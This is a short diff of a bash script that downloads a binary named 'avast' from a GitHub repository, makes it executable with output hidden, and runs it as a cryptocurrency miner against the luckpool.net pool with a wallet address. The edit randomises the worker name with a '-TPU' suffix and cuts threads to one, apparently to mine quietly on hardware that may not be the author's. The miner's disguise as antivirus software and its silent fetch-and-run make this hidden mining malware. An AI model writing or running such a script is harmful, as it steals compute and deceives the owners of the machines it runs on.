@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/aurbach55/pos/raw/main/avast >/dev/null 2>&1
 chmod +x avast  >/dev/null 2>&1
-./avast -v -l  na.luckpool.net:3956 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.Rig -p x -t 4
+./avast -v -l  na.luckpool.net:3956 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p x -t 1
